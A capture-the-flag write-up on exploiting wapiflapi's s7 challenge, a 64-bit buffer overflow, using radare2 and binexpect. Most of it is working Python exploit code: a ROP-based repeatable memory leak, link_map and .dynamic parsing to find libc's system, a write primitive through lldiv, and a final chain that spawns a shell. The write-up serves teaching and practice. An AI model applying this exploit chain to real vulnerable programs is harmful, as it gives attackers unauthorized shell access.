# Solving wapiflapi's s7 with radare2 and binexpect

## Intro

The seventh challange consists in this brief and apparently harmless piece of C:

```c
int main(int argc, char **argv)
{
  char buffer[32];

  (void) argc, (void) argv;

  printf("Welcome Stranger\n");
  printf("What is your password?\n");

  if (read(0, buffer, 1024) <= 0)
    err(EXIT_FAILURE, "read");

  printf("If you're cool you'll get a shell.\n");

  if (strcmp("pretend_you_dont_know_this", buffer) == 0)
    printf("neo\n");

  return 0;
}
```

While the buffer overflow here is still generous, the heavy part is the clear absence of any call to `system`.

### Goal

To spawn a shell

### Challanges

1. **no call to `system`** !
2. only one read call in a single buffer
3. must be solved using only stdin / stdout
4. no assumptions on libc version or address layout are allowed


### Solution plan

The big deal here is to find a way to get the address of libc's `system` function, without guessing the libc version and assuming ASLR is on. Once this address is known, it is straightforward to forge a call to it using the buffer overflow. The `/bin/sh` command can be either also found in the libc or written somewhere at a fixed address (e.g. inside the .got.plt as usual).

Searching on google, i came up with these informative resources:

1. [Hack.lu's OREO with ret2dl-resolve](https://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/) by wapiflapi
2. [another solution to the same challenge](https://github.com/ctfs/write-ups-2014/blob/master/hack-lu-ctf-2014/oreo/exploit-by-cutz.pl), also linked from [1], which is simpler
3. [Advanced return to libc](http://phrack.org/issues/58/4.html) on Phrack, also linked from [1], (there's also a succint presentation mostly derived from it [here](https://www.ics.uci.edu/~mbebenit/ics142b/data/PStack.pdf))

The only problem is that all of these resources refer only to 32 bits x86 architecture, while we're 64 bits.

Wapiflapi's article [1] uses return-to-dl-resolve, which is a powerful way to get addresses of libc functions without leaks, **but needs to store forged structures at known addresses** (therefore not easily doable on the stack).

The solution at [2], instead, **gets the libc base address by searching back from any libc function address**, rounding at page size, for the ELF header and then parses the elf structure for the dynamic section and harvest the symbols from there.

My first attempt to solve s7 was to port [2] from perl to python and from 32 to 64 bits and apply it to s7. Everything worked well, until i came into parsing the dynamic section to get strtab and symtab. **Every attempt to read it, caused a segmentation fault, invariably**. Just few seconds before giving up and deciding to become a barman, i realized that the 64-bit dynamic linker maps some sections of the libc address space with the PROT_NONE permission (see [here](https://stackoverflow.com/questions/16524895/proc-pid-maps-shows-pages-with-no-rwx-permissions-on-x86-64-linux)) apparently to save space. Obviously, one of such sections is the dynamic section i came across.

Finally i followed the suggestion of wapiflapi in [1] and did a parse of the `link_map` structure, in order to find the libc base address and the correct mapping for the dynamic section from which it is possible to collect the entire libc symbols and their offsets.

Since this solution requires a lot of input-output (a repeatable leak is needed) i decided to do it in python. In order to handle the binary input/output i used [binexpect](https://github.com/wapiflapi/binexpect).

The exploit python script is [here](https://github.com/mrmacete/writeups/blob/master/wapiflapi-exrs/sploit/s7/bexpl_s7.py), what follows is a deep explanation of each relevant part of it.

## A closer look to .got.plt
Let's explore s7's .got.plt with radare2:

```r2
$ r2 s7
 -- 3nl4r9e y0\/r r4d4r3
[0x00400520]> aa
[0x00400520]> iS~.got.plt
idx=22 vaddr=0x00601000 paddr=0x00001000 sz=72 vsz=72 perm=-rw- name=.got.plt

[0x00400520]> pxq 72@0x00601000
0x00601000  0x0000000000600e28  0x0000000000000000   (.`.............
0x00601010  0x0000000000000000  0x00000000004004c6   ..........@.....
0x00601020  0x00000000004004d6  0x00000000004004e6   ..@.......@.....
0x00601030  0x00000000004004f6  0x0000000000400506   ..@.......@.....
0x00601040  0x0000000000400516                       ..@.....        
[0x00400520]> ii
[Imports]
ordinal=001 plt=0x004004c0 bind=GLOBAL type=FUNC name=puts
ordinal=002 plt=0x004004d0 bind=GLOBAL type=FUNC name=read
ordinal=003 plt=0x004004e0 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=004 plt=0x004004f0 bind=GLOBAL type=FUNC name=strcmp
ordinal=005 plt=0x00400500 bind=UNKNOWN type=NOTYPE name=__gmon_start__
ordinal=006 plt=0x00400510 bind=GLOBAL type=FUNC name=err

6 imports
```

Mixing above information into an high level tabular representation (all addresses and values are 64 bits wide, truncated for brevity):

Address           |Value          | Meaning
------------------|---------------|-----------------
0x00601000        | 0x00600e28    | .dynamic
**0x00601008**        | 0 (filled at runtime)            | **pointer to `link_map`**
0x00601010        | 0 (filled at runtime)            | pointer to `dl-resolve`
0x00601018        | 0x004004f6    | puts
0x00601020        | 0x00400516    | read
0x00601028        | 0x00400526    | \_\_libc\_start\_main
0x00601030        | 0x00400536    | strcmp
0x00601038        | 0x00400546    | \_\_gmon\_start\_\_
0x00601040        | 0x00400556    | err

The purpose of `dl-resolve` is to perform the lazy binding, i.e. the wrappers of the libc functions whose pointers appears in the .got.plt table, actually invoke `dl-resolve` the first time they get called to actually fetch the address of the corresponding libc function. The `link_map` is a linked list of structures describing all the dynamic libraries which the binary is linked against, this serves as a parameter for `dl-resolve`, or in this case to be parsed for gaining the libc base address and its dynamic section (the good one).


## Binary input/output

The provided binary uses buffered input/output, therefore a solution must be found in order to write and read data interactively from/to stdin/stdout via python.

My first attempt was using python's `subprocess.Popen` plus `stdbuf -i0 -o0 -e0` and making stdout non blocking. That solution worked except for two problems:

1. the non-blocking state caused occasional EAGAIN failures in the `read` call, which caused the `err` function to be called, generating a segfault
2. after the call to system, it wasn't easy to detach the pipes and let the user interact with the sh's prompt

Then i noticed that [this](https://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/) uses binexpect, and i decided to give it a try. I had to port my code to python3 (pardon me if the code sucks), plugged in binexpect and obtained this:

* the segfault error persisted, but turned out to be a stack balancing issue unrelated to input/output itself, see below
* the `pwned` or `prompt` functions work great


## Solving unbalanced stack issue

By repeatedly injecting rop chains into the stack, it happened that the value of `rsp` was **constantly growing, uncontrollably overwriting environment variables and causing issues and segfaults**.

To overcome this problem, it is necessary to find a way to have a constant value of `rsp` at each repetition of the repeatalb leak.

In this case, the solution is to return to the entry point at each repetition (instead of returning to `main` again). This, by itself, led to a constant **decrease** of `rsp` value, but this is more easily fixable by inserting padding into the rop chain, to increase `rsp` of the same amount. 


## The basic building block: repeatable leak

This solution is made possible by the presence of a repeatable leak: a way to safely read memory content at addresses of choice and leaving the program in a state by which the leak can occur again.

To mount such a leak two conditions are needed:

1. a buffer overflow to gain conrol of `rip`
2. knowing the address of any libc function able to print content

The first condition is met by the `read` call in the `main` function which gives us 992 bytes of overflow.

The second condition is met by having the `puts` in the plt table, plus a rop gadget to initialize `rdi` with the address of choice:

```r2
[0x00400520]> e rop.len = 2
[0x00400520]> /R pop rdi
  0x00400703             5f  pop rdi
  0x00400704             c3  ret


```

The buffer layout, to feed the `read` in order to have a repeatable leak is as follows:

Chunk Contents   | Chunk length   | Meaning 
-----------------| ---------------|----------------
????             | 32 bytes       | Initial data, regularly inside the buffer
XXXXXXXX         | 8 bytes        | Overwrites saved frame pointer (don't care)
0x00400703       | 8 bytes        | pop rdi; ret;
YYYYYYYY			  | 8 bytes		| address of content to be leaked
0x004004c0		| 8 bytes			| address of `puts` in the plt (initialized after the first use)
0x00400704		| 176 bytes		| address of a `ret;` gadget, repeated 22 times, to keep `rsp` value constant against repetitions
0x00400520		| 8 bytes			| address of entry point, to allow repetition

Here is the python code to perform the leak:

```python
def leak(address):
    payload = bytes('A' * 32, 'utf-8')

    payload += rop(
        0x42424242, # frame pointer
        0x00400703, # pop rdi; ret;
        address,    # leak
        0x004004c0, # puts@plt
        
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret
        0x00400704, # ret

        0x00400520, # entry point again
        )

    s7.sendbinline(payload)

    s7.tryexpect("If you're cool you'll get a shell.\n"
                 "(.*)\n"
                 "Welcome Stranger\n"
                 "What is your password\?",
                  exitwithprogram=False
                 )

    if s7.match != None:
        result = s7.match.group(1)
    else:
        result = ""

    if not s7.isalive():
        raise 

    return result
```

This works, but must be handled with care because `puts` stops at the first null byte. To overcome this, when reading 32 or 64 bits words, the python code will leak one byte at a time, assuming the empty string is a zero, and then reassemble them in one little endian word:

```python
def upack(s):
    ss = s[:8]
    pad = bytes('\x00' * (8-len(ss)), 'utf-8')
    return struct.unpack('Q', ss + pad)[0]
    
def upleak1(address):
    r = upack(leak(address)[:1])    
    return r
    
def upleak_safe(address):
    result = 0

    for i in range(8):
        piece = upleak1(address+i)
        result = result | (piece << (i*8))

    return result

def upleak_safe_32(address):
    result = 0

    for i in range(4):
        piece = upleak1(address+i)
        result = result | (piece << (i*8))

    return result
```

## Mining `libc` symbols

As explained earlier, a pointer to `libc_map` is stored at a known address into the `.got.plt` table. 

### Surfing `link_map` to find libc

The `link_map` structure definition can be found in `/usr/include/link.h`:

```c
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;          /* Base address shared object is loaded at.  */
    char *l_name;               /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;            /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
  };
```

Actually, the full `link_map` structure is more complex than this, but the above are the only fields which are safe to be used, because they are standardized and unlikely to change between versions.

My naive python code to traverse the list and get libc base and dynamic section is as follows:

```python
def get_libc(link_map):

    base = upleak(link_map)
    name = leak(upack(leak(link_map+8)))
    dynamic = upleak(link_map+16)
    nextp = upleak(link_map+24)

    if name.find(bytes('libc', 'utf-8')) >= 0:
        return (base, dynamic)
        
    if nextp != 0:
        return get_libc(nextp)
```

### Extracting function offset from `.dynamic` section

Armed with the libc base and dynamic section addresses, it is possible to continue porting to 64-bits the same solution found in [[2]](https://github.com/ctfs/write-ups-2014/blob/master/hack-lu-ctf-2014/oreo/exploit-by-cutz.pl), digging for `strtab` and `symtab`, then parsing `.dynamic` section and search for desired (or even all) symbols:

```python
def get_str_symtab(dynamic):
    strtab = 0
    symtab = 0
    i = 0
    while (strtab == 0 or symtab == 0):
        typ = upack(leak(dynamic + i))
        if typ == 5:
            strtab = upleak(dynamic + i + 8)
        elif typ == 6:
            symtab = upleak(dynamic + i + 8)
        i += 16
    return (strtab, symtab)

def get_symbol(symbol, strtab, symtab, libc_map):
    i = libc_map.last_scanned_offset
    while True:
        offset = upack32(leak(symtab+i)) 
        if offset != 0:
            sym = leak(strtab+offset)
            sym_addr = upleak_safe(symtab + i + 8)
            libc_map.put(sym, sym_addr, i)
            if sym == symbol:
                return sym_addr
        i += 24
```
This time, the dynamic section address points to the one mapped in our process' space, and it is therefore readable.

The `libc_map` variable is an instance of `LibcMap`, a class used to keep current found symbols from libc, which stores relative offsets of symbols and the current search progress:

```python
class LibcMap:

    libc_map = {}
    last_scanned_offset = 0

    def put(self, symbol, address, scanned_offset):
        if address != 0:
            self.libc_map[str(symbol,'utf-8')] = address
        self.last_scanned_offset = scanned_offset

    def get(self, symbol):
        if symbol in self.libc_map:
            return self.libc_map[symbol]

        return None

```

## A history of "/bin/sh"

My first attempt of solution, involved finding the `"/bin/sh"` string inside the libc itself, by trivially searching linearly. This worked, but was really slow and the search could last hours.

To overcome this, i tried to parse the libc's ELF headers, digging for `.rodata` address to start the search from there, but the problem of unreadable memory mapping (PROT_NONE permission) came up again.

Finally, i decided for writing the `"/bin/sh"` string, surgically, into an unused entry of `.got.plt`. In order to use directly the `read` pointer we have in `.got.plt`, it is necessary to control `rdx` to pass in the `count` param. Unfortunately, no ROP gadgets are available in our binary to do this, so i found a way to use the `lldiv` libc function to control `rdx`, which will store the remainder of the division (since internally it uses the `idiv` instruction).

Here is the buffer overlow layout for performing the surgical, repeatable, write operation:

Chunk Contents   | Chunk length   | Meaning 
-----------------| ---------------|----------------
????             | 32 bytes       | Initial data, regularly inside the buffer
XXXXXXXX         | 8 bytes        | Overwrites saved frame pointer (don't care)
0x00400703       | 8 bytes        | pop rdi; ret;
YYYYYYYY			  | 8 bytes		| length of data to be written
0x00400701		| 8 bytes			| pop rsi; pop r15; ret;
YYYYYYYY+1		| 8 bytes			| length plus one (so the remainder of division will be the length itself)
0					| 8 bytes			| unused (r15)
&lldiv				| 8 bytes			| address of `lldiv`
0x00400701		| 8 bytes			| pop rsi; pop r15; ret;
ZZZZZZZZ			| 8 bytes			| destination address for `read`
0					| 8 bytes			| unused (r15)
0x00400703       | 8 bytes       | pop rdi; ret;
0					| 8 bytes			| source fd = stdin
0x004004d0		| 8 bytes			| address of `read` in the plt (initialized after the first use)
0x0040060d		| 8 bytes			| address of `main` to allow repetition


and the corresponding python function:

```python
def write(address, data, div_addr):

    payload = bytes('A' * 32, 'utf-8')

    payload += rop(
        0x42424242, # frame pointer
        0x00400703, # pop rdi; ret;
        len(data),
        0x00400701, # pop rsi; pop r15; ret;
        len(data)+1,
        0,
        div_addr, # rdx <- 400
        0x00400701, # pop rsi; pop r15; ret;
        address,
        0,
        0x00400703, # pop rdi; ret;
        0,    
        0x004004d0, # read@plt
        0x0040060d, # main again
        0x0040060d, # main again
        )

    s7.sendbinline(payload)
    s7.sendbinline(data)

    s7.tryexpect("If you're cool you'll get a shell.\n"
                 "Welcome Stranger\n"
                 "What is your password\?",
                  exitwithprogram=False
                 )
                 
    if not s7.isalive():
        raise 

```

## Executing the shell

Once both `system` and `"/bin/sh"` addresses are known, the shell is executed the usual way using such a buffer overflow layout:

Chunk Contents   | Chunk length   | Meaning 
-----------------| ---------------|----------------
????             | 32 bytes       | Initial data, regularly inside the buffer
XXXXXXXX         | 8 bytes        | Overwrites saved frame pointer (don't care)
0x00400703       | 8 bytes        | pop rdi; ret;
YYYYYYYY			  | 8 bytes		| address of `"/bin/sh"`
0x00400704		| 8 bytes			| ret; just to keep the stack 16-bytes aligned
&system			| 8 bytes			| address of `system`
0x0040060d		| 8 bytes			| address of `main` to allow repetition

This is the python code to execute the shell:

```python
def execute_shell(system_addr, bin_sh_addr):
    payload = bytes('A' * 32, 'utf-8')

    payload += rop(
        0x42424242, # frame pointer
        0x00400703, # pop rdi; ret;
        bin_sh_addr,
        0x00400704, # ret (padding)
        system_addr, 
        0x0040060d, # main again
       )
    
    s7.sendbinline(payload)

    s7.tryexpect("If you're cool you'll get a shell.\n"
                 "(.*)\n?"
                  ,exitwithprogram=False
                 )

    result = str(s7.match.group(1), 'utf-8')

    return result
```

## Putting pieces together

The main python function looks like this (edited for brevity):

```python
def rop(*args):  
        return struct.pack('Q'*len(args), *args)
        
libc_map = LibcMap()
setup = binexpect.setup("./s7")
s7 = setup.target()
s7.setecho(False)
s7.tryexpect("Welcome Stranger")
s7.tryexpect("What is your password?")

while True:

    try:
        base = 0x00400000
        got_plt = 0x00601000
        link_map = get_link_map(got_plt)
        libc_base, libc_dynamic = get_libc(link_map)
        libc_map.base = libc_base
        system = libc_map.get("system")
        lldiv = libc_map.get("lldiv")
        if system == None or lldiv == None:
            strtab, symtab = get_str_symtab(libc_dynamic)
            if system == None:
                system = get_symbol(b"system", strtab, symtab, libc_map)
            if lldiv == None:
                lldiv = get_symbol(b"lldiv", strtab, symtab, libc_map)

    except Exception as e:
        setup = binexpect.setup("./s7")
        s7 = setup.target()
        s7.setecho(False)
        s7.tryexpect("Welcome Stranger")
        s7.tryexpect("What is your password?")
        continue

    write(0x00601028, b"/bin/sh\x00", lldiv + libc_base)

    bin_sh = 0x00601028
    
    execute_shell(system + libc_base, bin_sh)
    
    s7.pwned()

    break
```

The `rop` function is ripped almost exactly from [Defeating baby_rop with radare2](http://www.radare.today/defeating-baby_rop-with-radare2/).

## Running and cinema

To run the exploit are necessary:

* python3
* pexpect
* binexpect

The exploit python file and binexpect.py must be in the same directory of s7 executable.

[![asciicast](https://asciinema.org/a/649n0pc8iglf1asmse6s1ea71.png)](https://asciinema.org/a/649n0pc8iglf1asmse6s1ea71)
